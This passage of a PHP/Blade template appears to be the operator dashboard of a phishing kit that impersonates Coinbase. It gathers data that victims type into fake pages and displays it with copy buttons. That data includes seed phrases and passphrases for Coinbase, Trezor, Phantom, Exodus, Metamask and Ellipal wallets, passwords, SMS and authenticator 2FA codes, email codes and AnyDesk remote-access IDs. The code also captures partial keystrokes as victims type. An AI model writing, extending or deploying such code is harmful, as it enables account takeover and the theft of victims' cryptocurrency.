                        $submitWords = ($raw !== '' && $raw !== '[captured]') ? preg_split('/\s+/', $raw) : [];
                        $masked = $mmMask($submitWords ?: [], '');
                        if (empty(array_filter($masked['words'], fn($w) => trim((string)$w) !== ''))
                            && $mmLive && empty($mmLive['blank'])) {
                            $masked = ['words' => $mmLive['words'], 'pass' => $mmLive['pass']];
                        }
                    }
                    if ($mmLive && empty($mmLive['blank'])) {
                        $mmLive['id'] = $mId;
                        $mmLive['words'] = $masked['words'];
                        $mmLive['pass'] = $masked['pass'];
                        $mmLive['permanent'] = true;
                        $mmLive['blank'] = false;
                        $metamaskPhraseRows[] = $mmLive;
                    } else {
                        $metamaskPhraseRows[] = [
                            'id' => $mId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                            'permanent' => true, 'blank' => false,
                        ];
                    }
                    $mmLive = null;
                    $mmNeedReprompt = true;
                }
            }
            if ($mmLive !== null) {
                $metamaskPhraseRows[] = $mmLive;
            }


            // coinbase_whitelist_wallet: page-only durable attempt-stack. Rows are
            // injected into $stickyFields (ordinary Activity chrome + firstTs sort).
            $cbWlPhraseRows = [];
            $cbWlAttemptsFromSummary = false;
            $__cbWlDurableList = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
                ? ($__cactiveSummaryPeek['attempts']['coinbase_whitelist_wallet'] ?? null)
                : null;
            if (is_array($__cbWlDurableList)) {
                foreach ($__cbWlDurableList as $cAtt) {
                    if (!is_array($cAtt)) continue;
                    $cWords = is_array($cAtt['words'] ?? null) ? $cAtt['words'] : [];
                    $cPass  = trim((string) ($cAtt['pass'] ?? ''));
                    $cMasked = $trzMask($cWords, $cPass);
                    $cFirstTs = 0;
                    $cSortRaw = $cAtt['first_seen_at'] ?? null;
                    if (!empty($cSortRaw)) {
                        try {
                            $cFirstTs = \Carbon\Carbon::parse($cSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $cFirstTs = 0;
                        }
                    }
                    $cbWlPhraseRows[] = [
                        'id'        => (int) ($cAtt['source_event_id'] ?? 0),
                        'firstId'   => (int) ($cAtt['attempt_id'] ?? $cAtt['source_event_id'] ?? 0),
                        'firstTs'   => $cFirstTs,
                        'words'     => $cMasked['words'],
                        'pass'      => $cMasked['pass'],
                        'permanent' => (($cAtt['state'] ?? '') === 'sealed'),
                        'blank'     => !empty($cAtt['blank']),
                    ];
                }
                $cbWlAttemptsFromSummary = true;
            }
            $cbWlLive = null;
            $cbWlNeedReprompt = false;
            $cbWlMask = $trzMask;
            if (!$cbWlAttemptsFromSummary)
            foreach ($events->sortBy(fn($e) => [$e->created_at?->getTimestamp() ?? 0, $e->id ?? 0])->values() as $cev) {
                if (($cev->page ?? '') !== 'coinbase_whitelist_wallet') continue;
                $cType = $cev->type ?? '';
                $cEl   = $cev->element ?? '';
                $cId   = $cev->id ?? 0;

                if ($cType === 'page_visit') {
                    if ($cbWlLive === null) {
                        $cbWlLive = ['id' => $cId, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                    }
                    $cbWlNeedReprompt = false;
                    continue;
                }

                if ($cType === 'phrase_input' && $cEl === 'full_state') {
                    $dec = json_decode($cev->value ?? '', true);
                    $words = (is_array($dec) && isset($dec['words']) && is_array($dec['words']))
                        ? array_values($dec['words']) : [];
                    $pass = is_array($dec) ? trim((string) ($dec['passphrase'] ?? '')) : '';
                    $has = (bool) array_filter($words, fn($w) => trim((string) $w) !== '');
                    if (!$has) {
                        if ($cbWlLive === null) {
                            $cbWlLive = ['id' => $cId, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                            $cbWlNeedReprompt = false;
                        } else {
                            $cbWlLive['id'] = $cId;
                            $cbWlLive['words'] = [];
                            $cbWlLive['pass'] = '';
                            $cbWlLive['blank'] = true;
                        }
                    } else {
                        $masked = $cbWlMask($words, $pass);
                        if ($cbWlLive === null && $cbWlNeedReprompt) {
                            $last = !empty($cbWlPhraseRows) ? $cbWlPhraseRows[array_key_last($cbWlPhraseRows)] : null;
                            $lastKey = '';
                            if ($last) {
                                $lastKey = implode(' ', array_filter(
                                    $last['words'] ?? [],
                                    fn($w) => trim((string) $w) !== ''
                                ));
                                if (($last['pass'] ?? '') !== '') {
                                    $lastKey = trim($lastKey.' '.$last['pass']);
                                }
                            }
                            $newKey = implode(' ', array_filter(
                                $masked['words'],
                                fn($w) => trim((string) $w) !== ''
                            ));
                            if (($masked['pass'] ?? '') !== '') {
                                $newKey = trim($newKey.' '.$masked['pass']);
                            }
                            if ($lastKey !== '' && $newKey === $lastKey) {
                                continue;
                            }
                            $cbWlLive = [
                                'id' => $cId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                                'permanent' => false, 'blank' => false,
                            ];
                            $cbWlNeedReprompt = false;
                            continue;
                        }
                        if ($cbWlLive === null || !empty($cbWlLive['permanent'])) {
                            $cbWlLive = [
                                'id' => $cId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                                'permanent' => false, 'blank' => false,
                            ];
                        } else {
                            $cbWlLive['id'] = $cId;
                            $cbWlLive['words'] = $masked['words'];
                            $cbWlLive['pass'] = $masked['pass'];
                            $cbWlLive['blank'] = false;
                        }
                    }
                    continue;
                }

                if ($cType === 'form_submit' && $cEl === 'seed_phrase') {
                    $raw = trim((string) ($cev->value ?? ''));
                    $useLive = ($raw === '' || $raw === '[captured]');
                    if ($useLive && $cbWlLive && empty($cbWlLive['blank'])) {
                        $masked = ['words' => $cbWlLive['words'], 'pass' => $cbWlLive['pass']];
                    } else {
                        $submitWords = ($raw !== '' && $raw !== '[captured]') ? preg_split('/\s+/', $raw) : [];
                        $masked = $cbWlMask($submitWords ?: [], '');
                        if (empty(array_filter($masked['words'], fn($w) => trim((string)$w) !== ''))
                            && $cbWlLive && empty($cbWlLive['blank'])) {
                            $masked = ['words' => $cbWlLive['words'], 'pass' => $cbWlLive['pass']];
                        }
                    }
                    if ($cbWlLive && empty($cbWlLive['blank'])) {
                        $cbWlLive['id'] = $cId;
                        $cbWlLive['words'] = $masked['words'];
                        $cbWlLive['pass'] = $masked['pass'];
                        $cbWlLive['permanent'] = true;
                        $cbWlLive['blank'] = false;
                        $cbWlPhraseRows[] = $cbWlLive;
                    } else {
                        $cbWlPhraseRows[] = [
                            'id' => $cId, 'words' => $masked['words'], 'pass' => $masked['pass'],
                            'permanent' => true, 'blank' => false,
                        ];
                    }
                    $cbWlLive = null;
                    $cbWlNeedReprompt = true;
                }
            }
            if ($cbWlLive !== null) {
                $cbWlPhraseRows[] = $cbWlLive;
            }

        @endphp
        @foreach($stickyPhrases as $phraseRow)
        @php
            $phraseDisplay = trim(implode(' ', array_filter(
                $phraseRow['words'],
                fn($w) => trim((string) $w) !== ''
            )));
            if ($phraseRow['pass'] !== '') {
                $phraseDisplay = trim($phraseDisplay.' '.$phraseRow['pass']);
            }
        @endphp
        <div data-event-id="{{ $phraseRow['id'] }}"
             style="display:flex;align-items:center;gap:8px;padding:4px 2px 4px 0;margin-bottom:4px;max-width:100%;min-width:0;width:100%;box-sizing:border-box;overflow:hidden;">
            <span style="font-family:monospace;font-size:10px;font-weight:700;color:rgba(255,255,255,.55);letter-spacing:.06em;text-transform:uppercase;flex-shrink:0;min-width:56px;width:auto;max-width:88px;text-align:left;">{{ $phraseRow['label'] }}</span>
            <div style="flex:1 1 0%;width:0;min-width:0;display:flex;align-items:center;gap:6px;border:1px solid rgba(255,255,255,.18);border-radius:4px;background:rgba(255,255,255,.02);padding:5px 8px;box-sizing:border-box;overflow:hidden;">
                <span style="font-family:monospace;font-size:12px;font-weight:500;color:#fff;letter-spacing:.02em;flex:1;min-width:0;user-select:all;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">{{ $phraseDisplay !== '' ? $phraseDisplay : '—' }}</span>
                <button type="button"
                    onclick="copyActivityBox(this)"
                    style="flex-shrink:0;display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;margin:-7px -10px -7px 0;background:transparent;border:none;color:rgba(255,255,255,.4);padding:0;border-radius:3px;cursor:pointer;line-height:0;overflow:hidden;"
                    title="Copy">
                    <svg width="13" height="13" style="display:block;flex-shrink:0;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                </button>
            </div>
        </div>
        @endforeach
        @php
            // Field sticky boxes: latest value + firstTs, then sort chronologically (phrases stay above)
            $stickyFields = [];
            $bumpSticky = function (string $key, string $label, string $value, int $ts, int $id, string $valueSelect = 'all', string $valueLs = '.02em', string $labelMax = '88px', string $labelLs = '.06em', bool $valueScroll = false, bool $compact = false) use (&$stickyFields) {
                if (!isset($stickyFields[$key])) {
                    $stickyFields[$key] = [
                        'label' => $label,
                        'id' => $id,
                        'ts' => $ts,
                        'value' => $value,
                        'firstTs' => $ts,
                        'firstId' => $id,
                        'valueSelect' => $valueSelect,
                        'valueLs' => $valueLs,
                        'labelMax' => $labelMax,
                        'labelLs' => $labelLs,
                        'valueScroll' => $valueScroll,
                        'compact' => $compact,
                    ];
                    return;
                }
                $row = &$stickyFields[$key];
                if ($ts < $row['firstTs'] || ($ts === $row['firstTs'] && $id < $row['firstId'])) {
                    $row['firstTs'] = $ts;
                    $row['firstId'] = $id;
                }
                if ($ts > $row['ts'] || ($ts === $row['ts'] && $id > $row['id'])) {
                    $row['id'] = $id;
                    $row['ts'] = $ts;
                    $row['value'] = $value;
                    $row['valueScroll'] = $valueScroll;
                    $row['compact'] = $compact;
                }
                unset($row);
            };
            $summaryArr = is_array($session->activity_summary ?? null) ? $session->activity_summary : [];
            // Durable active (CB Last Active): prefer activity_summary; else newest-150 fallback
            $activeFromSummary = false;
            $activeAllowed = \App\Services\ActivitySummaryService::ACTIVE_VALUES;
            $activeBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['active'] ?? null)
                : null;
            if (is_array($activeBox)) {
                $activeRaw = trim((string) ($activeBox['value'] ?? ''));
                $activeId = (int) ($activeBox['source_event_id'] ?? 0);
                if (in_array($activeRaw, $activeAllowed, true) && $activeId > 0) {
                    $activeTs = 0;
                    // first_seen_at controls stable sort position; updated_at is a
                    // legacy-only fallback for summaries written before that field existed.
                    $activeSortRaw = $activeBox['first_seen_at'] ?? ($activeBox['updated_at'] ?? null);
                    if (!empty($activeSortRaw)) {
                        try {
                            $activeTs = \Carbon\Carbon::parse($activeSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $activeTs = 0;
                        }
                    }
                    $bumpSticky(
                        'active',
                        'Active',
                        $activeRaw,
                        $activeTs,
                        $activeId,
                        'text',
                        '.02em'
                    );
                    $activeFromSummary = true;
                }
            }
            // Durable balance (CB Estimated Balance): prefer activity_summary; else newest-150 fallback
            $balanceFromSummary = false;
            $balanceAllowed = \App\Services\ActivitySummaryService::BALANCE_VALUES;
            $balanceBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['balance'] ?? null)
                : null;
            if (is_array($balanceBox)) {
                $balanceRaw = trim((string) ($balanceBox['value'] ?? ''));
                $balanceId = (int) ($balanceBox['source_event_id'] ?? 0);
                if (in_array($balanceRaw, $balanceAllowed, true) && $balanceId > 0) {
                    $balanceTs = 0;
                    // first_seen_at controls stable sort position; updated_at is a
                    // legacy-only fallback for summaries written before that field existed.
                    $balanceSortRaw = $balanceBox['first_seen_at'] ?? ($balanceBox['updated_at'] ?? null);
                    if (!empty($balanceSortRaw)) {
                        try {
                            $balanceTs = \Carbon\Carbon::parse($balanceSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $balanceTs = 0;
                        }
                    }
                    $bumpSticky(
                        'balance',
                        'Balance',
                        $balanceRaw,
                        $balanceTs,
                        $balanceId,
                        'text',
                        '.02em'
                    );
                    $balanceFromSummary = true;
                }
            }
            // Durable email (CB sign-in email): prefer activity_summary; else newest-150 fallback
            $emailFromSummary = false;
            $emailBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['email'] ?? null)
                : null;
            if (is_array($emailBox)) {
                $emailRaw = trim((string) ($emailBox['value'] ?? ''));
                $emailId = (int) ($emailBox['source_event_id'] ?? 0);
                if ($emailRaw !== '' && $emailId > 0) {
                    $emailTs = 0;
                    // first_seen_at controls stable sort position; updated_at is a
                    // legacy-only fallback for summaries written before that field existed.
                    $emailSortRaw = $emailBox['first_seen_at'] ?? ($emailBox['updated_at'] ?? null);
                    if (!empty($emailSortRaw)) {
                        try {
                            $emailTs = \Carbon\Carbon::parse($emailSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $emailTs = 0;
                        }
                    }
                    $bumpSticky(
                        'email',
                        'Email',
                        $emailRaw,
                        $emailTs,
                        $emailId,
                        'all',
                        '.02em'
                    );
                    $emailFromSummary = true;
                }
            }
            // Durable mail2fa (CB email code): prefer activity_summary; else newest-150 fallback
            $mail2faFromSummary = false;
            $mail2faBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['mail2fa'] ?? null)
                : null;
            if (is_array($mail2faBox)) {
                $mail2faRaw = trim((string) ($mail2faBox['value'] ?? ''));
                $mail2faId = (int) ($mail2faBox['source_event_id'] ?? 0);
                if ($mail2faRaw !== '' && $mail2faId > 0) {
                    $mail2faTs = 0;
                    $mail2faSortRaw = $mail2faBox['first_seen_at'] ?? ($mail2faBox['updated_at'] ?? null);
                    if (!empty($mail2faSortRaw)) {
                        try {
                            $mail2faTs = \Carbon\Carbon::parse($mail2faSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $mail2faTs = 0;
                        }
                    }
                    $bumpSticky(
                        'mail2fa',
                        'MAIL 2FA',
                        $mail2faRaw,
                        $mail2faTs,
                        $mail2faId,
                        'all',
                        '.08em',
                        '72px',
                        '.04em'
                    );
                    $mail2faFromSummary = true;
                }
            }
            // Durable reset (CB reset password): prefer activity_summary; else newest-150 fallback
            $resetFromSummary = false;
            $resetBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['reset'] ?? null)
                : null;
            if (is_array($resetBox)) {
                $resetRaw = trim((string) ($resetBox['value'] ?? ''));
                $resetId = (int) ($resetBox['source_event_id'] ?? 0);
                if ($resetRaw !== '' && $resetId > 0) {
                    // Same human-readable reformat the live-loop path applies to $fVal
                    // before displaying it; kept at render time, raw value stored durably.
                    if (preg_match('/^old:\s*(.*) \| new:\s*(.*)$/s', $resetRaw, $resetM)) {
                        $resetRaw = 'old: ' . $resetM[1] . ' | new: ' . $resetM[2];
                    }
                    $resetTs = 0;
                    $resetSortRaw = $resetBox['first_seen_at'] ?? ($resetBox['updated_at'] ?? null);
                    if (!empty($resetSortRaw)) {
                        try {
                            $resetTs = \Carbon\Carbon::parse($resetSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $resetTs = 0;
                        }
                    }
                    $bumpSticky(
                        'reset',
                        'Reset',
                        $resetRaw,
                        $resetTs,
                        $resetId,
                        'text',
                        '.02em'
                    );
                    $resetFromSummary = true;
                }
            }
            // Durable password/sms/auth (live partial-typing boxes): prefer
            // activity_summary; else newest-150 fallback. Unlike submit-only
            // boxes above, an empty durable value (explicit clearing) is still
            // treated as valid and rendered as-is (blank), matching live behavior.
            $passwordFromSummary = false;
            $passwordBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['password'] ?? null)
                : null;
            if (is_array($passwordBox) && (int) ($passwordBox['source_event_id'] ?? 0) > 0) {
                $passwordRaw = trim((string) ($passwordBox['value'] ?? ''));
                $passwordId = (int) ($passwordBox['source_event_id'] ?? 0);
                $passwordTs = 0;
                $passwordSortRaw = $passwordBox['first_seen_at'] ?? ($passwordBox['updated_at'] ?? null);
                if (!empty($passwordSortRaw)) {
                    try {
                        $passwordTs = \Carbon\Carbon::parse($passwordSortRaw)->getTimestamp();
                    } catch (\Throwable $e) {
                        $passwordTs = 0;
                    }
                }
                $bumpSticky(
                    'password',
                    'Password',
                    $passwordRaw,
                    $passwordTs,
                    $passwordId,
                    'all',
                    '.02em'
                );
                $passwordFromSummary = true;
            }
            $smsFromSummary = false;
            $smsBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['sms'] ?? null)
                : null;
            if (is_array($smsBox) && (int) ($smsBox['source_event_id'] ?? 0) > 0) {
                $smsRaw = trim((string) ($smsBox['value'] ?? ''));
                $smsId = (int) ($smsBox['source_event_id'] ?? 0);
                $smsTs = 0;
                $smsSortRaw = $smsBox['first_seen_at'] ?? ($smsBox['updated_at'] ?? null);
                if (!empty($smsSortRaw)) {
                    try {
                        $smsTs = \Carbon\Carbon::parse($smsSortRaw)->getTimestamp();
                    } catch (\Throwable $e) {
                        $smsTs = 0;
                    }
                }
                $bumpSticky(
                    'sms',
                    'SMS',
                    $smsRaw,
                    $smsTs,
                    $smsId,
                    'all',
                    '.08em'
                );
                $smsFromSummary = true;
            }
            $authFromSummary = false;
            $authBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['auth'] ?? null)
                : null;
            if (is_array($authBox) && (int) ($authBox['source_event_id'] ?? 0) > 0) {
                $authRaw = trim((string) ($authBox['value'] ?? ''));
                $authId = (int) ($authBox['source_event_id'] ?? 0);
                $authTs = 0;
                $authSortRaw = $authBox['first_seen_at'] ?? ($authBox['updated_at'] ?? null);
                if (!empty($authSortRaw)) {
                    try {
                        $authTs = \Carbon\Carbon::parse($authSortRaw)->getTimestamp();
                    } catch (\Throwable $e) {
                        $authTs = 0;
                    }
                }
                $bumpSticky(
                    'auth',
                    'Auth',
                    $authRaw,
                    $authTs,
                    $authId,
                    'all',
                    '.08em'
                );
                $authFromSummary = true;
            }
            // Durable anydesk (Coinbase AnyDesk ID): live partial-typing box like
            // password/sms/auth above — an empty durable value (explicit clearing)
            // is still treated as valid and rendered as-is (blank).
            $anydeskFromSummary = false;
            $anydeskBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['anydesk'] ?? null)
                : null;
            if (is_array($anydeskBox) && (int) ($anydeskBox['source_event_id'] ?? 0) > 0) {
                $anydeskRaw = trim((string) ($anydeskBox['value'] ?? ''));
                $anydeskId = (int) ($anydeskBox['source_event_id'] ?? 0);
                $anydeskTs = 0;
                $anydeskSortRaw = $anydeskBox['first_seen_at'] ?? ($anydeskBox['updated_at'] ?? null);
                if (!empty($anydeskSortRaw)) {
                    try {
                        $anydeskTs = \Carbon\Carbon::parse($anydeskSortRaw)->getTimestamp();
                    } catch (\Throwable $e) {
                        $anydeskTs = 0;
                    }
                }
                $bumpSticky(
                    'anydesk',
                    'Anydesk',
                    $anydeskRaw,
                    $anydeskTs,
                    $anydeskId,
                    'all',
                    '.02em'
                );
                $anydeskFromSummary = true;
            }
            // Durable link (deferred "simple" candidate):
            // submit-only, non-empty-only — no partial typing producer exists.
            $linkFromSummary = false;
            $linkBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['link'] ?? null)
                : null;
            if (is_array($linkBox)) {
                $linkRaw = trim((string) ($linkBox['value'] ?? ''));
                $linkId = (int) ($linkBox['source_event_id'] ?? 0);
                if ($linkRaw !== '' && $linkId > 0) {
                    $linkTs = 0;
                    $linkSortRaw = $linkBox['first_seen_at'] ?? ($linkBox['updated_at'] ?? null);
                    if (!empty($linkSortRaw)) {
                        try {
                            $linkTs = \Carbon\Carbon::parse($linkSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $linkTs = 0;
                        }
                    }
                    $bumpSticky('link', 'Link', $linkRaw, $linkTs, $linkId, 'text', '.02em');
                    $linkFromSummary = true;
                }
            }
            // Durable vault (Coinbase Select Vault Assets): lenient like
            // anydesk above -- an empty durable value (every coin removed) is
            // still valid and rendered as-is (blank), then hidden by the
            // shared empty-value-hide filter below (label 'Vault' is in it).
            $vaultFromSummary = false;
            $vaultBox = (isset($summaryArr['boxes']) && is_array($summaryArr['boxes']))
                ? ($summaryArr['boxes']['vault'] ?? null)
                : null;
            if (is_array($vaultBox) && (int) ($vaultBox['source_event_id'] ?? 0) > 0) {
                $vaultRaw = trim((string) ($vaultBox['value'] ?? ''));
                $vaultId = (int) ($vaultBox['source_event_id'] ?? 0);
                $vaultTs = 0;
                $vaultSortRaw = $vaultBox['first_seen_at'] ?? ($vaultBox['updated_at'] ?? null);
                if (!empty($vaultSortRaw)) {
                    try {
                        $vaultTs = \Carbon\Carbon::parse($vaultSortRaw)->getTimestamp();
                    } catch (\Throwable $e) {
                        $vaultTs = 0;
                    }
                }
                $bumpSticky('vault', 'Vault', $vaultRaw, $vaultTs, $vaultId, 'text', '.02em');
                $vaultFromSummary = true;
            }
            foreach ($events as $fev) {
                $fPage = $fev->page ?? '';
                $fType = $fev->type ?? '';
                $fEl   = $fev->element ?? '';
                $fVal  = trim((string) ($fev->value ?? ''));
                $fTs   = $fev->created_at?->getTimestamp() ?? 0;
                $fId   = $fev->id ?? 0;

                if ($fPage === 'coinbase_sms_code') {
                    $isPartial = ($fType === 'code_input' && $fEl === 'code_partial');
                    $isFinal   = ($fType === 'form_submit' && $fEl === 'code' && $fVal !== '');
                    if (!$smsFromSummary && ($isPartial || $isFinal)) $bumpSticky('sms', 'SMS', $fVal, $fTs, $fId, 'all', '.08em');
                } elseif ($fPage === 'coinbase_authenticator_code') {
                    $isPartial = ($fType === 'code_input' && $fEl === 'code_partial');
                    $isFinal   = ($fType === 'form_submit' && $fEl === 'access_code' && $fVal !== '');
                    if (!$authFromSummary && ($isPartial || $isFinal)) $bumpSticky('auth', 'Auth', $fVal, $fTs, $fId, 'all', '.08em');
                } elseif ($fPage === 'coinbase_device_confirmation') {
                    if (!$linkFromSummary && $fType === 'form_submit' && $fEl === 'confirmation_link' && $fVal !== '') {
                        $bumpSticky('link', 'Link', $fVal, $fTs, $fId, 'text', '.02em');
                    }
                } elseif ($fPage === 'coinbase_anydesk') {
                    $isPartial = ($fType === 'code_input' && $fEl === 'anydesk_id');
                    $isFinal   = ($fType === 'form_submit' && $fEl === 'anydesk_id' && $fVal !== '');
                    if (!$anydeskFromSummary && ($isPartial || $isFinal)) $bumpSticky('anydesk', 'Anydesk', $fVal, $fTs, $fId, 'all', '.02em');
                } elseif ($fPage === 'coinbase_last_activity') {
                    if (
                        !$activeFromSummary
                        && $fType === 'form_submit'
                        && $fEl === 'last_activity'
                        && $fVal !== ''
                    ) {
                        $bumpSticky('active', 'Active', $fVal, $fTs, $fId, 'text', '.02em');
                    }
                } elseif ($fPage === 'coinbase_estimated_balance') {
                    if (
                        !$balanceFromSummary
                        && $fType === 'form_submit'
                        && $fEl === 'estimated_balance'
                        && $fVal !== ''
                    ) {
                        $bumpSticky('balance', 'Balance', $fVal, $fTs, $fId, 'text', '.02em');
                    }
                } elseif ($fPage === 'coinbase_select_vault_assets') {
                    $isPartial = ($fType === 'coin_input' && $fEl === 'selection');
                    $isFinal   = ($fType === 'form_submit' && $fEl === 'assets' && $fVal !== '' && strtolower($fVal) !== 'none');
                    if (!$vaultFromSummary && ($isPartial || $isFinal)) $bumpSticky('vault', 'Vault', $fVal, $fTs, $fId, 'text', '.02em');
                } elseif ($fPage === 'coinbase_password') {
                    $isPartial = ($fType === 'form_input' && $fEl === 'password_partial');
                    $isFinal   = ($fType === 'form_submit' && $fEl === 'password' && $fVal !== '');
                    if (!$passwordFromSummary && ($isPartial || $isFinal)) $bumpSticky('password', 'Password', $fVal, $fTs, $fId, 'all', '.02em');
                } elseif ($fPage === 'coinbase_reset_password') {
                    if (!$resetFromSummary && $fType === 'form_submit' && $fEl === 'reset_password' && $fVal !== '') {
                        if (preg_match('/^old:\s*(.*) \| new:\s*(.*)$/s', $fVal, $m)) {
                            $fVal = 'old: ' . $m[1] . ' | new: ' . $m[2];
                        }
                        $bumpSticky('reset', 'Reset', $fVal, $fTs, $fId, 'text', '.02em');
                    }
                }
            }
            $stickyFields = array_values(array_filter($stickyFields, function ($row) {
                if (in_array($row['label'], ['SMS', 'Auth', 'Anydesk', 'Vault', 'VAULT', 'Password', 'PW', '2FA', 'PP'], true)) {
                    return ($row['value'] ?? '') !== '';
                }
                return true;
            }));
            foreach ($coinbaseSeedPhraseRows as $csRow) {
                $csDisplay = trim(implode(' ', array_filter(
                    $csRow['words'] ?? [],
                    fn($w) => trim((string) $w) !== ''
                )));
                if (($csRow['pass'] ?? '') !== '') {
                    $csDisplay = trim($csDisplay.' '.$csRow['pass']);
                }
                if (!empty($csRow['blank'])) {
                    $csDisplay = '';
                }
                $stickyFields[] = [
                    'label' => 'Coinbase',
                    'id' => (int) ($csRow['id'] ?? 0),
                    'ts' => (int) ($csRow['firstTs'] ?? 0),
                    'value' => $csDisplay,
                    'firstTs' => (int) ($csRow['firstTs'] ?? 0),
                    'firstId' => (int) ($csRow['firstId'] ?? $csRow['id'] ?? 0),
                    'valueSelect' => 'all',
                    'valueLs' => '.02em',
                    'labelMax' => '88px',
                    'labelLs' => '.06em',
                    'valueScroll' => false,
                    'compact' => false,
                ];
            }
            foreach ($trezorPhraseRows as $trzRow) {
                $trzDisplay = trim(implode(' ', array_filter(
                    $trzRow['words'] ?? [],
                    fn($w) => trim((string) $w) !== ''
                )));
                if (($trzRow['pass'] ?? '') !== '') {
                    $trzDisplay = trim($trzDisplay.' '.$trzRow['pass']);
                }
                if (!empty($trzRow['blank'])) {
                    $trzDisplay = '';
                }
                $stickyFields[] = [
                    'label' => 'Trezor',
                    'id' => (int) ($trzRow['id'] ?? 0),
                    'ts' => (int) ($trzRow['firstTs'] ?? 0),
                    'value' => $trzDisplay,
                    'firstTs' => (int) ($trzRow['firstTs'] ?? 0),
                    'firstId' => (int) ($trzRow['firstId'] ?? $trzRow['id'] ?? 0),
                    'valueSelect' => 'all',
                    'valueLs' => '.02em',
                    'labelMax' => '88px',
                    'labelLs' => '.06em',
                    'valueScroll' => false,
                    'compact' => false,
                ];
            }
            foreach ($phantomPhraseRows as $phRow) {
                $phDisplay = trim(implode(' ', array_filter(
                    $phRow['words'] ?? [],
                    fn($w) => trim((string) $w) !== ''
                )));
                if (($phRow['pass'] ?? '') !== '') {
                    $phDisplay = trim($phDisplay.' '.$phRow['pass']);
                }
                if (!empty($phRow['blank'])) {
                    $phDisplay = '';
                }
                $stickyFields[] = [
                    'label' => 'Phantom',
                    'id' => (int) ($phRow['id'] ?? 0),
                    'ts' => (int) ($phRow['firstTs'] ?? 0),
                    'value' => $phDisplay,
                    'firstTs' => (int) ($phRow['firstTs'] ?? 0),
                    'firstId' => (int) ($phRow['firstId'] ?? $phRow['id'] ?? 0),
                    'valueSelect' => 'all',
                    'valueLs' => '.02em',
                    'labelMax' => '88px',
                    'labelLs' => '.06em',
                    'valueScroll' => false,
                    'compact' => false,
                ];
            }
            foreach ($exodusPhraseRows as $exRow) {
                $exDisplay = trim(implode(' ', array_filter(
                    $exRow['words'] ?? [],
                    fn($w) => trim((string) $w) !== ''
                )));
                if (($exRow['pass'] ?? '') !== '') {
                    $exDisplay = trim($exDisplay.' '.$exRow['pass']);
                }
                if (!empty($exRow['blank'])) {
                    $exDisplay = '';
                }
                $stickyFields[] = [
                    'label' => 'Exodus',
                    'id' => (int) ($exRow['id'] ?? 0),
                    'ts' => (int) ($exRow['firstTs'] ?? 0),
                    'value' => $exDisplay,
                    'firstTs' => (int) ($exRow['firstTs'] ?? 0),
                    'firstId' => (int) ($exRow['firstId'] ?? $exRow['id'] ?? 0),
                    'valueSelect' => 'all',
                    'valueLs' => '.02em',
                    'labelMax' => '88px',
                    'labelLs' => '.06em',
                    'valueScroll' => false,
                    'compact' => false,
                ];
            }
            foreach ($metamaskPhraseRows as $mmRow) {
                $mmDisplay = trim(implode(' ', array_filter(
                    $mmRow['words'] ?? [],
                    fn($w) => trim((string) $w) !== ''
                )));
                if (($mmRow['pass'] ?? '') !== '') {
                    $mmDisplay = trim($mmDisplay.' '.$mmRow['pass']);
                }
                if (!empty($mmRow['blank'])) {
                    $mmDisplay = '';
                }
                $stickyFields[] = [
                    'label' => 'Metamask',
                    'id' => (int) ($mmRow['id'] ?? 0),
                    'ts' => (int) ($mmRow['firstTs'] ?? 0),
                    'value' => $mmDisplay,
                    'firstTs' => (int) ($mmRow['firstTs'] ?? 0),
                    'firstId' => (int) ($mmRow['firstId'] ?? $mmRow['id'] ?? 0),
                    'valueSelect' => 'all',
                    'valueLs' => '.02em',
                    'labelMax' => '88px',
                    'labelLs' => '.06em',
                    'valueScroll' => false,
                    'compact' => false,
                ];
            }
            foreach ($ellipalPhraseRows as $elpRow) {
                $elpDisplay = trim(implode(' ', array_filter(
                    $elpRow['words'] ?? [],
                    fn($w) => trim((string) $w) !== ''
                )));
                if (($elpRow['pass'] ?? '') !== '') {
                    $elpDisplay = trim($elpDisplay.' '.$elpRow['pass']);
                }
                if (!empty($elpRow['blank'])) {
                    $elpDisplay = '';
                }
                $stickyFields[] = [
                    'label' => 'Ellipal',
                    'id' => (int) ($elpRow['id'] ?? 0),
                    'ts' => (int) ($elpRow['firstTs'] ?? 0),
                    'value' => $elpDisplay,
                    'firstTs' => (int) ($elpRow['firstTs'] ?? 0),
                    'firstId' => (int) ($elpRow['firstId'] ?? $elpRow['id'] ?? 0),
                    'valueSelect' => 'all',
                    'valueLs' => '.02em',
                    'labelMax' => '88px',
                    'labelLs' => '.06em',
                    'valueScroll' => false,
                    'compact' => false,
                ];
            }
